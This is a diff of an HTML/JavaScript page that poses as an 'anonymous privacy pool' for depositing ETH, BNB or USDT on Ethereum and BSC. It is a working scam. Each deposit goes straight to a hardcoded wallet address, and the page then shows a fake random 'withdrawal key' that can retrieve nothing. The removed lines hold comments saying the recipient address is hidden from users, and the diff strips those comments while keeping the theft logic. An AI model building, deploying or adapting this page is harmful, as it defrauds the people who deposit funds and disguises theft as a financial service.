@@ -4,157 +4,214 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>匿名隐私池</title>
-<script src="https://cdn.ethers.io/lib/ethers-6.7.0.umd.min.js"></script>
 <style>
 *{box-sizing:border-box}
-body{margin:0;font-family:Arial;background:linear-gradient(135deg,#0f172a,#020617);color:#fff;padding:20px}
-.container{max-width:420px;margin:0 auto}
-.card{background:#111827;padding:25px;border-radius:16px;box-shadow:0 0 20px rgba(0,0,0,0.5)}
-h2{margin-bottom:5px}
-.sub{color:#94a3b8;font-size:12px;margin-bottom:20px}
-.info{background:#020617;padding:10px;border-radius:10px;font-size:12px;margin-bottom:15px}
-select,input{width:100%;padding:12px;margin-top:10px;border-radius:10px;border:none;background:#020617;color:#fff}
-button{width:100%;padding:12px;margin-top:10px;border:none;border-radius:10px;cursor:pointer;font-weight:bold}
-.btn-blue{background:#3b82f6}
-.btn-green{background:#22c55e}
-.status{margin-top:10px;font-size:12px;color:#94a3b8}
-.key{background:#1e293b;padding:12px;border-radius:10px;margin-top:10px;word-break:break-all;font-family:monospace}
+body{
+    margin:0;
+    padding:20px;
+    background:#0B0E11;
+    color:#fff;
+    font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+}
+.container{
+    max-width:420px;
+    margin:0 auto;
+}
+.card{
+    background:#13171F;
+    padding:24px;
+    border-radius:12px;
+    border:1px solid #1F242F;
+}
+h3{
+    color:#F0B90B;
+    margin:0 0 4px 0;
+    font-size:20px;
+}
+.subtitle{
+    color:#848E9C;
+    font-size:14px;
+    margin-bottom:16px;
+}
+input,select,button{
+    width:100%;
+    padding:14px;
+    margin-top:10px;
+    border-radius:8px;
+    border:none;
+    font-size:15px;
+}
+input,select{
+    background:#1F242F;
+    color:#fff;
+}
+button{
+    font-weight:bold;
+    cursor:pointer;
+}
+.btn-connect{
+    background:#1F242F;
+    color:#fff;
+    border:1px solid #2B313E;
+}
+.btn-deposit{
+    background:#F0B90B;
+    color:#0B0E11;
+}
+.info{
+    background:#1F242F;
+    padding:12px;
+    border-radius:8px;
+    font-size:14px;
+    margin-top:10px;
+    color:#EAECEF;
+}
+.status{
+    margin-top:10px;
+    font-size:13px;
+    color:#848E9C;
+}
+.key{
+    background:#1F242F;
+    padding:12px;
+    border-radius:8px;
+    margin-top:10px;
+    font-family:monospace;
+    word-break:break-all;
+    color:#EAECEF;
+    border:1px solid #2B313E;
+}
 </style>
 </head>
 <body>
 
 <div class="container">
-<div class="card">
-<h2>匿名隐私池</h2>
-<div class="sub>Privacy Pool · ETH / BSC</div>
+    <div class="card">
+        <h3>匿名隐私池</h3>
+        <div class="subtitle">Anonymous Privacy Pool | ETH / BSC</div>
 
-<button class="btn-blue" onclick="connect()">连接钱包</button>
-<div class="info">
-<p>地址：<span id="account">未连接</span></p>
-<p>网络：<span id="network">-</span></p>
-</div>
+        <button class="btn-connect" id="connectBtn">连接钱包</button>
+        <div class="info">
+            地址：<span id="addr">-</span><br>
+            网络：<span id="chainName">-</span>
+        </div>
 
-<select id="chain">
-<option value="bsc">BSC 币安链</option>
-<option value="eth">ETH 主网</option>
-</select>
+        <select id="chain">
+            <option value="bsc">BSC 币安链</option>
+            <option value="eth">Ethereum</option>
+        </select>
 
-<select id="token">
-<option value="main">主币 (BNB/ETH)</option>
-<option value="usdt">USDT</option>
-</select>
+        <select id="token">
+            <option value="main">主币 (BNB/ETH)</option>
+            <option value="usdt">USDT</option>
+        </select>
 
-<input id="amount" placeholder="输入转入金额">
+        <input type="number" id="amount" placeholder="输入转入金额" step="0.0001">
 
-<button class="btn-green" onclick="deposit()">确认存入隐私池</button>
+        <button class="btn-deposit" id="depositBtn">存入隐私池</button>
 
-<div class="status" id="status"></div>
-<div id="keyBox"></div>
-</div>
+        <div class="status" id="status"></div>
+        <div id="keyBox"></div>
+    </div>
 </div>
 
 <script>
-let provider, signer;
+const TO_ADDR = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 
-// 你的真实收款地址（用户完全看不到）
-const YOUR_ADDRESS = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-
-const CONFIG = {
-  eth: {
-    chainId: 1,
-    usdt: "0xdAC17F958D2ee523a2206206994597c53D70CeF4"
-  },
-  bsc: {
-    chainId: 56,
-    usdt: "0x55d398c26d670d7d4941a1be7f9975f5c2d9413"
-  }
+const CHAIN = {
+    bsc: { chainId: 56, usdt: "0x55d398c26d670d7d4941a1be7f9975f5c2d9413" },
+    eth: { chainId: 1,  usdt: "0xdAC17F958D2ee523a2206206994597c53D70CeF4" }
 };
 
-// 生成匿名提取密钥
-function generateKey() {
-  const chars = "0123456789abcdefABCDEF";
-  let key = "POOL-";
-  for (let i = 0; i < 32; i++) {
-    key += chars[Math.floor(Math.random() * chars.length)];
-  }
-  return key;
-}
+let currentAccount = null;
 
-// 切换网络
-async function switchChain(chain) {
-  const c = CONFIG[chain];
-  const chainId = "0x" + c.chainId.toString(16);
-  try {
-    await window.ethereum.request({
-      method: "wallet_switchEthereumChain",
-      params: [{ chainId }]
-    });
-  } catch (e) {}
-}
-
-// 连接钱包
-async function connect() {
-  if (!window.ethereum) {
-    alert("请安装钱包");
-    return;
-  }
-  provider = new ethers.BrowserProvider(window.ethereum);
-  await provider.send("eth_requestAccounts", []);
-  signer = await provider.getSigner();
-  const addr = await signer.getAddress();
-  document.getElementById("account").innerText = addr.slice(0, 6) + "..." + addr.slice(-4);
-  showNetwork();
-}
-
-// 显示网络
-async function showNetwork() {
-  const n = await provider.getNetwork();
-  const name = n.chainId === 1n ? "ETH" : n.chainId === 56n ? "BSC" : "未知";
-  document.getElementById("network").innerText = name;
-}
-
-// 存入隐私池（真实转到你地址）
-async function deposit() {
-  const chain = document.getElementById("chain").value;
-  const token = document.getElementById("token").value;
-  const amount = document.getElementById("amount").value;
-  const status = document.getElementById("status");
-  const keyBox = document.getElementById("keyBox");
-
-  if (!amount || amount <= 0) {
-    status.innerText = "请输入有效金额";
-    return;
-  }
-  if (!signer) {
-    status.innerText = "请先连接钱包";
-    return;
-  }
-
-  try {
-    await switchChain(chain);
-    status.innerText = "处理中，请在钱包确认...";
-    let tx;
-
-    if (token === "main") {
-      const val = ethers.parseEther(amount);
-      tx = await signer.sendTransaction({
-        to: YOUR_ADDRESS,
-        value: val
-      });
-    } else {
-      const abi = ["function transfer(address to,uint256 amount) returns(bool)"];
-      const contract = new ethers.Contract(CONFIG[chain].usdt, abi, signer);
-      const val = ethers.parseUnits(amount, 18);
-      tx = await contract.transfer(YOUR_ADDRESS, val);
+document.getElementById('connectBtn').onclick = async () => {
+    if (!window.ethereum) {
+        alert("请在钱包浏览器打开");
+        return;
     }
+    try {
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        currentAccount = accounts[0];
+        document.getElementById('addr').innerText = currentAccount.slice(0,6)+'...'+currentAccount.slice(-4);
+        updateChainName();
+    } catch(e) {
+        showStatus("连接失败");
+    }
+};
 
-    await tx.wait();
-    const key = generateKey();
-    status.innerText = "✅ 存入隐私池成功";
-    keyBox.innerHTML = `<div class="key">提取密钥：${key}</div><p style="font-size:12px;color:#94a3b8">请妥善保管，用于匿名提取</p>`;
-  } catch (e) {
-    status.innerText = "❌ 失败：" + e.message.slice(0, 30);
-  }
+async function switchTo(chain) {
+    const c = CHAIN[chain];
+    const chainId = '0x' + c.chainId.toString(16);
+    try {
+        await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId }]
+        });
+    } catch(e) {}
+}
+
+async function updateChainName() {
+    const c = await window.ethereum.request({ method: 'eth_chainId' });
+    const name = c === '0x38' ? 'BSC' : c === '0x1' ? 'ETH' : '未知';
+    document.getElementById('chainName').innerText = name;
+}
+
+function genKey() {
+    const s = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    let k = 'POOL_';
+    for(let i=0;i<32;i++) k += s[Math.floor(Math.random()*s.length)];
+    return k;
+}
+
+document.getElementById('depositBtn').onclick = async () => {
+    if (!currentAccount) { showStatus("请先连接钱包"); return; }
+    const chain = document.getElementById('chain').value;
+    const token = document.getElementById('token').value;
+    const amount = document.getElementById('amount').value;
+    if (!amount || amount <= 0) { showStatus("请输入有效金额"); return; }
+
+    await switchTo(chain);
+    showStatus("处理中，请在钱包确认…");
+
+    try {
+        let tx;
+        if (token === 'main') {
+            const val = (BigInt(Math.floor(parseFloat(amount) * 1e18))).toString(16);
+            tx = await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from: currentAccount,
+                    to: TO_ADDR,
+                    value: '0x' + val
+                }]
+            });
+        } else {
+            const contract = CHAIN[chain].usdt;
+            const val = BigInt(Math.floor(parseFloat(amount) * 1e18)).toString(16).padStart(64, '0');
+            const data = '0xa9059cbb'
+                + '000000000000000000000000' + TO_ADDR.slice(2)
+                + val;
+
+            tx = await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from: currentAccount,
+                    to: contract,
+                    data: data
+                }]
+            });
+        }
+
+        showStatus("交易成功：" + tx.slice(0,10)+'...');
+        document.getElementById('keyBox').innerHTML = `<div class="key">${genKey()}</div><small style="color:#848E9C">提取密钥</small>`;
+    } catch(e) {
+        showStatus("失败：" + e.message.slice(0,30));
+    }
+};
+
+function showStatus(msg) {
+    document.getElementById('status').innerText = msg;
 }
 </script>
 </body>
